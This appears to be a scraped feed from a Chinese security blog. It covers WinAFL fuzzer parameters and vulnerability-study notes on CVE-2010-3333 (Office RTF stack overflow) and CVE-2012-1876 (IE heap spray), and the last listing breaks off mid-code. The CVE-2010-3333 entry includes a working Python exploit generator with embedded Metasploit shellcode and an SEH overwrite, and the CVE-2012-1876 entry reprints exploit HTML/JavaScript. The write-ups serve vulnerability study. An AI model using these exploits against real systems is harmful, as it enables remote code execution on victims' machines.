    <content type="html"><![CDATA[<p><strong> !! 这篇文章大部分内容丢失了，重要数据一定要备份！</strong></p>
<h3 id="Winafl的参数"><a href="#Winafl的参数" class="headerlink" title="Winafl的参数"></a>Winafl的参数</h3><ul>
<li><p>covtype - 覆盖类型</p>
<p>  覆盖类型分为bb(basic block)和edge两种类型，bb表示在记录被覆盖路径时只记录路径，而不像edge类型还记录从一个路径到另一个路径的转换。</p>
<p>  比如以下的例子：</p>
<blockquote>
<p>#1:   A -&gt; B -&gt; C -&gt; D -&gt; E</p>
<p>#2:   A -&gt; B -&gt; D -&gt; C -&gt; E</p>
</blockquote>
<p>  在bb类型中，只记录了程序走过这5个路径，而不记录走过的顺序，所以bb类型无法区分<code>#1</code>和<code>#2</code>有什么不同。而edge通过以下<a href="http://lcamtuf.coredump.cx/afl/technical_details.txt" target="_blank" rel="noopener">算法</a>来记录路径的转换。</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>  bb类型记录路径在winafl的实现：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset = cur_location - module_base_address;</span><br><span class="line">offset &amp;= MAP_SIZE - <span class="number">1</span>;</span><br><span class="line">shared_mem[offset]++;</span><br></pre></td></tr></table></figure>
</li>
<li><p>target_module &amp;&amp; (target_method || target_offset) - 目标函数</p>
<p>  当使用<code>target_module</code>参数，则必须指定<code>target_method</code>或<code>target_offset</code>。</p>
<p>  这些参数的作用是当被fuzz的程序执行到指定的目标函数时，winafl记录当前参数；而当执行完这个函数准备退出时，winafl会恢复PC指针、栈顶指针和先前记录的参数，从而使得程序回到目标函数迭代执行。</p>
<p>  Winafl保存的参数数量根据winafl的<code>nargs</code>参数而定，默认是0。 迭代的次数根据<code>fuzz_iterations</code>参数，默认是1000。</p>
</li>
</ul>
<h3 id="Afl的参数"><a href="#Afl的参数" class="headerlink" title="Afl的参数"></a>Afl的参数</h3><ul>
<li><p>i - 样本目录</p>
<p>  顾名思义，这个参数指向放着样本的目录。当参数值是 <em>-</em> 时，afl会恢复上次执行。</p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt; !! 这篇文章大部分内容丢失了，重要数据一定要备份！&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Winafl的参数&quot;&gt;&lt;a href=&quot;#Winafl的参数&quot; class=&quot;headerlink&quot; title=&quot;Winafl的参数&quot;&gt;&lt;/a&gt;Winafl的
    
    </summary>
    
    
      <category term="Fuzz - Winafl" scheme="http://www.ench4nt3r.com/tags/Fuzz-Winafl/"/>
    
  </entry>
  
  <entry>
    <title>漏洞战争笔记之Cve-2010-3333</title>
    <link href="http://www.ench4nt3r.com/2016/11/20/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E7%AC%94%E8%AE%B0%E4%B9%8BCve-2010-3333/"/>
    <id>http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/</id>
    <published>2016-11-19T16:00:00.000Z</published>
    <updated>2017-07-09T06:19:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>实验环境：</p>
<p>windows xp sp3 pro</p>
<p>office 2007</p>
<a id="more"></a>
<h3 id="诡异的运算"><a href="#诡异的运算" class="headerlink" title="诡异的运算"></a>诡异的运算</h3><p>书上有讲，打开poc后会断在<code>rep movs dword ptr es:[edi], dword ptr [esi]</code>，然而并没有。</p>
<p>将windbg附上winword.exe，打开poc，windbg停在了这里：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(5d4.60c): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=3c524228 ebx=00000000 ecx=0011fe34 edx=00000000 esi=0107c398 edi=0011fff0</span><br><span class="line">eip=32cf3814 esp=0011fde8 ebp=0011fde8 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</span><br><span class="line">mso!Ordinal7356+0x1315:</span><br><span class="line">32cf3814 8b4804          mov     ecx,dword ptr [eax+4] ds:0023:3c52422c=????????</span><br></pre></td></tr></table></figure></p>
<p>瞅瞅<code>eax</code>的值从哪来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; ub @eip</span><br><span class="line">mso!Ordinal7356+0x12fd:</span><br><span class="line">32cf37fc 0000            add     byte ptr [eax],al</span><br><span class="line">32cf37fe 3442            xor     al,42h</span><br><span class="line">32cf3800 b301            mov     bl,1</span><br><span class="line">32cf3802 e97cffffff      jmp     mso!Ordinal7356+0x1284 (32cf3783)</span><br><span class="line">32cf3807 55              push    ebp</span><br><span class="line">32cf3808 8bec            mov     ebp,esp</span><br><span class="line">32cf380a 8b450c          mov     eax,dword ptr [ebp+0Ch]</span><br><span class="line">32cf380d 8d04c52038cf32  lea     eax,mso!Ordinal7356+0x1321 (32cf3820)[eax*8]</span><br></pre></td></tr></table></figure></p>
<p>在<code>32cf380a</code>下个断点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:006&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=0011fdfc ebx=00000000 ecx=0011fe34 edx=00000000 esi=0107c3b0 edi=0011fff0</span><br><span class="line">eip=32cf380a esp=0011fde8 ebp=0011fde8 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mso!Ordinal7356+0x130b:</span><br><span class="line">32cf380a 8b450c          mov     eax,dword ptr [ebp+0Ch] ss:0023:0011fdf4=41306141</span><br></pre></td></tr></table></figure></p>
<p>用编辑器打开poc，搜索<code>41613041</code>，搜索命中，看来这个数据是从poc里拿过来的。现在来看看调用栈，看看它来自何方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; kb 5</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">0011fde8 32e5944d 0011fdfc 41306141 05000000 mso!Ordinal7356+0x130b</span><br><span class="line">0011fe04 32e595bf 41306141 41386141 0011fe34 mso!Ordinal2605+0x326e</span><br><span class="line">0011fe3c 37614136 41386141 62413961 31624130 mso!Ordinal2605+0x33e0</span><br><span class="line">0011fe40 41386141 62413961 31624130 41326241 0x37614136</span><br><span class="line">0011fe44 62413961 31624130 41326241 62413362 0x41386141</span><br></pre></td></tr></table></figure></p>
<p>可以看见<code>41306141</code>最后出现的位置是在<code>0011fe04 32e595bf 41306141 41386141 0011fe34 mso!Ordinal2605+0x326e</code>。</p>
<p>看看<code>32e595bf</code>处的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; ub 32e595bf L14</span><br><span class="line">mso!Ordinal2605+0x33a9:</span><br><span class="line">32e59588 ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">32e5958b 8b7064          mov     esi,dword ptr [eax+64h]</span><br><span class="line">32e5958e 8365f800        and     dword ptr [ebp-8],0</span><br><span class="line">32e59592 8b06            mov     eax,dword ptr [esi]</span><br><span class="line">32e59594 8d4df0          lea     ecx,[ebp-10h]</span><br><span class="line">32e59597 51              push    ecx</span><br><span class="line">32e59598 bb00000005      mov     ebx,5000000h</span><br><span class="line">32e5959d 56              push    esi</span><br><span class="line">32e5959e 895df4          mov     dword ptr [ebp-0Ch],ebx</span><br><span class="line">32e595a1 ff501c          call    dword ptr [eax+1Ch]</span><br><span class="line">32e595a4 8b4514          mov     eax,dword ptr [ebp+14h]</span><br><span class="line">32e595a7 ff7518          push    dword ptr [ebp+18h]</span><br><span class="line">32e595aa f7d8            neg     eax</span><br><span class="line">32e595ac 1bc0            sbb     eax,eax</span><br><span class="line">32e595ae 8d4df8          lea     ecx,[ebp-8]</span><br><span class="line">32e595b1 23c1            and     eax,ecx</span><br><span class="line">32e595b3 50              push    eax</span><br><span class="line">32e595b4 ff7508          push    dword ptr [ebp+8]</span><br><span class="line">32e595b7 ff75f0          push    dword ptr [ebp-10h]</span><br><span class="line">32e595ba e85cfeffff      call    mso!Ordinal2605+0x323c (32e5941b)</span><br></pre></td></tr></table></figure></p>
<p>第一个参数来自<code>[ebp-10h]</code>，并且在上面的代码中，看起来似乎是在这里<code>32e595a1 ff501c          call    dword ptr [eax+1Ch]</code>填充了它，来确定一下是不是跟我们说的一样，在<code>32e595a1</code>下个断点。</p>
<p>调用之前：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=32a0c8c4 ebx=05000000 ecx=0011fe2c edx=00000300 esi=0107c518 edi=0011fff0</span><br><span class="line">eip=32e595a1 esp=0011fe10 ebp=0011fe3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mso!Ordinal2605+0x33c2:</span><br><span class="line">32e595a1 ff501c          call    dword ptr [eax+1Ch]  ds:0023:32a0c8e0=327c002c</span><br><span class="line">0:000&gt; db ebp-10</span><br><span class="line">0011fe2c  76 00 fe 00 00 00 00 05-00 00 00 00 fe 00 ff ff  v...............</span><br><span class="line">0011fe3c  6c fe 11 00 f4 96 e5 32-a8 ff 11 00 00 00 00 00  l......2........</span><br><span class="line">0011fe4c  ff ff ff ff 00 00 00 00-18 08 61 04 50 0d 12 00  ..........a.P...</span><br><span class="line">0011fe5c  b4 04 12 00 10 01 12 00-ce de c9 47 00 00 00 00  ...........G....</span><br><span class="line">0011fe6c  c8 00 12 00 bb 98 e5 32-f0 ff 11 00 a8 ff 11 00  .......2........</span><br><span class="line">0011fe7c  00 00 00 00 18 08 61 04-00 00 00 00 b4 04 12 00  ......a.........</span><br><span class="line">0011fe8c  10 01 12 00 00 00 00 00-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">0011fe9c  ff ff ff ff 00 00 00 00-00 00 00 20 00 01 01 00  ........... ....</span><br></pre></td></tr></table></figure></p>
<p>调用之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; p</span><br><span class="line">eax=0011fe2c ebx=05000000 ecx=00000000 edx=00000000 esi=0107c518 edi=0011fff0</span><br><span class="line">eip=32e595a4 esp=0011fe1c ebp=0011fe3c iopl=0         nv up ei pl nz ac po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212</span><br><span class="line">mso!Ordinal2605+0x33c5:</span><br><span class="line">32e595a4 8b4514          mov     eax,dword ptr [ebp+14h] ss:0023:0011fe50=41326241</span><br><span class="line">0:000&gt; db ebp-10</span><br><span class="line">0011fe2c  41 61 30 41 61 31 41 61-32 41 61 33 41 61 34 41  Aa0Aa1Aa2Aa3Aa4A</span><br><span class="line">0011fe3c  61 35 41 61 36 41 61 37-41 61 38 41 61 39 41 62  a5Aa6Aa7Aa8Aa9Ab</span><br><span class="line">0011fe4c  30 41 62 31 41 62 32 41-62 33 41 62 34 41 62 35  0Ab1Ab2Ab3Ab4Ab5</span><br><span class="line">0011fe5c  41 62 36 41 62 37 41 62-38 41 62 39 41 63 30 41  Ab6Ab7Ab8Ab9Ac0A</span><br><span class="line">0011fe6c  63 31 41 63 32 41 63 33-41 63 34 41 63 35 41 63  c1Ac2Ac3Ac4Ac5Ac</span><br><span class="line">0011fe7c  36 41 63 37 41 63 38 41-63 39 41 64 30 41 64 31  6Ac7Ac8Ac9Ad0Ad1</span><br><span class="line">0011fe8c  41 64 32 41 64 33 41 64-34 41 64 35 41 64 36 41  Ad2Ad3Ad4Ad5Ad6A</span><br><span class="line">0011fe9c  64 37 41 64 38 41 64 39-41 65 30 41 65 31 41 65  d7Ad8Ad9Ae0Ae1Ae</span><br></pre></td></tr></table></figure></p>
<p>一般情况下，<code>[ebp+4]</code>存储着函数返回地址，调用之前<code>[ebp+4]</code>存储的是<code>f4 96 e5 32</code>，调用之后存储的是<code>36 41 61 37</code>。（此事说明了溢出发生）</p>
<p>现在，回到书上看看，<code>32e595a1</code>的上下内容跟书上40页讲的一致。</p>
<p>跟书上不一样的原因应该是，我的栈有足够大的空间容纳这些字符串，而书上没有，所以书上在memcpy就触发了异常，而我的跑到<code>mov     ecx,dword ptr [eax+4]</code>才抛出异常。在书的44页也有讲到<code>mov     ecx,dword ptr [eax+4]</code>这个诡异的运算。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line"><span class="keyword">from</span> mako.template <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows/exec - 189 bytes</span></span><br><span class="line"><span class="comment"># http://www.metasploit.com</span></span><br><span class="line"><span class="comment"># VERBOSE=false, PrependMigrate=false, EXITFUNC=process,</span></span><br><span class="line"><span class="comment"># CMD=calc</span></span><br><span class="line">buf = <span class="string">""</span></span><br><span class="line">buf += <span class="string">"fce8820000006089e531c0648b"</span></span><br><span class="line">buf += <span class="string">"50308b520c8b52148b72280fb7"</span></span><br><span class="line">buf += <span class="string">"4a2631ffac3c617c022c20c1cf"</span></span><br><span class="line">buf += <span class="string">"0d01c7e2f252578b52108b4a3c"</span></span><br><span class="line">buf += <span class="string">"8b4c1178e34801d1518b592001"</span></span><br><span class="line">buf += <span class="string">"d38b4918e33a498b348b01d631"</span></span><br><span class="line">buf += <span class="string">"ffacc1cf0d01c738e075f6037d"</span></span><br><span class="line">buf += <span class="string">"f83b7d2475e4588b582401d366"</span></span><br><span class="line">buf += <span class="string">"8b0c4b8b581c01d38b048b01d0"</span></span><br><span class="line">buf += <span class="string">"894424245b5b61595a51ffe05f"</span></span><br><span class="line">buf += <span class="string">"5f5a8b12eb8d5d6a018d85b200"</span></span><br><span class="line">buf += <span class="string">"00005068318b6f87ffd5bbf0b5"</span></span><br><span class="line">buf += <span class="string">"a25668a695bd9dffd53c067c0a"</span></span><br><span class="line">buf += <span class="string">"80fbe07505bb4713726f6a0053"</span></span><br><span class="line">buf += <span class="string">"ffd563616c6300"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_int</span><span class="params">(v)</span>:</span></span><br><span class="line">    array = format(v, <span class="string">'x'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(array) % <span class="number">2</span>:</span><br><span class="line">        array = <span class="string">'0'</span> + array</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(array[i<span class="number">-2</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(array), <span class="number">0</span>, <span class="number">-2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = <span class="number">0xc8ac</span></span><br><span class="line"></span><br><span class="line">exp = <span class="string">'1'</span> * <span class="number">0x10</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">exp += <span class="string">'1'</span> * <span class="number">4</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数返回地址的位置，放置jmp esp的地址</span></span><br><span class="line"><span class="comment">#exp += encode_int(0x76a7068d)</span></span><br><span class="line">exp += <span class="string">'90909090'</span></span><br><span class="line"></span><br><span class="line">exp += <span class="string">'2'</span> * <span class="number">0x10</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ebp + 0x18 = 0 跳过诡异的运算</span></span><br><span class="line"><span class="comment">#exp += '0' * 8</span></span><br><span class="line">exp += <span class="string">'1'</span> * <span class="number">8</span> <span class="comment"># 异常</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jmp esp</span></span><br><span class="line">exp += buf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 到异常链的填充</span></span><br><span class="line">exp += <span class="string">'3'</span> * (<span class="number">0x1718</span> - len(buf)/<span class="number">2</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># next SEH</span></span><br><span class="line">exp += <span class="string">'eb06ebf8'</span></span><br><span class="line"><span class="comment"># SEH Handle</span></span><br><span class="line">exp += <span class="string">'0b0b2800'</span></span><br><span class="line"><span class="comment"># jmp shellcode</span></span><br><span class="line">exp += <span class="string">'e9dbe8ffff'</span></span><br><span class="line"></span><br><span class="line">exp += <span class="string">'1'</span> * (length - len(exp))</span><br><span class="line"></span><br><span class="line">t = Template(filename=<span class="string">'./template.txt'</span>)</span><br><span class="line">ttf = t.render(length=encode_int(length), content=exp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'poc.rtf'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ttf)</span><br></pre></td></tr></table></figure></p>
<p>template.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\rtf1&#123;\shp&#123;\sp&#123;\sn pFragments&#125;&#123;\sv 1;7;11111111$&#123;length&#125;$&#123;content&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验环境：&lt;/p&gt;
&lt;p&gt;windows xp sp3 pro&lt;/p&gt;
&lt;p&gt;office 2007&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://www.ench4nt3r.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="漏洞战争" scheme="http://www.ench4nt3r.com/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"/>
    
  </entry>
  
  <entry>
    <title>Cve-2012-1876 exploit</title>
    <link href="http://www.ench4nt3r.com/2016/11/20/Cve-2012-1876-exploit/"/>
    <id>http://www.ench4nt3r.com/2016/11/20/Cve-2012-1876-exploit/</id>
    <published>2016-11-19T16:00:00.000Z</published>
    <updated>2017-07-09T06:18:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>《漏洞战争》第三章中有讲Cve-2012-1876，书上带的exp如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        </span></span><br><span class="line"><span class="undefined">var leak_index = -1;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var dap = "EEEE";</span></span><br><span class="line"><span class="xml">while ( dap.length <span class="tag">&lt; <span class="attr">480</span> ) <span class="attr">dap</span> += <span class="string">dap;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var padding = "AAAA";</span></span><br><span class="line"><span class="xml">while ( padding.length <span class="tag">&lt; <span class="attr">480</span> ) <span class="attr">padding</span> += <span class="string">padding;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var filler = "BBBB";</span></span><br><span class="line"><span class="xml">while ( filler.length <span class="tag">&lt; <span class="attr">480</span> ) <span class="attr">filler</span> += <span class="string">filler;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">//spray</span></span><br><span class="line"><span class="undefined">var arr = new Array();</span></span><br><span class="line"><span class="undefined">var rra = new Array();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var div_container = document.getElementById("test");</span></span><br><span class="line"><span class="undefined">div_container.style.cssText = "display:none";</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">for (var i=0; i <span class="tag">&lt; <span class="attr">500</span>; <span class="attr">i</span>+=<span class="string">2)</span> &#123;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    // E</span></span><br><span class="line"><span class="undefined">    rra[i] = dap.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    // S, bstr = A</span></span><br><span class="line"><span class="undefined">    arr[i] = padding.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    // A, bstr = B</span></span><br><span class="line"><span class="undefined">    arr[i+1] = filler.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    // B</span></span><br><span class="line"><span class="undefined">    var obj = document.createElement("button");</span></span><br><span class="line"><span class="undefined">    div_container.appendChild(obj);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">for (var i=200; i<span class="tag">&lt;<span class="name">500;</span> <span class="attr">i</span>+=<span class="string">2</span> ) &#123;</span></span></span><br><span class="line"><span class="undefined">    rra[i] = null;</span></span><br><span class="line"><span class="undefined">    CollectGarbage();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span 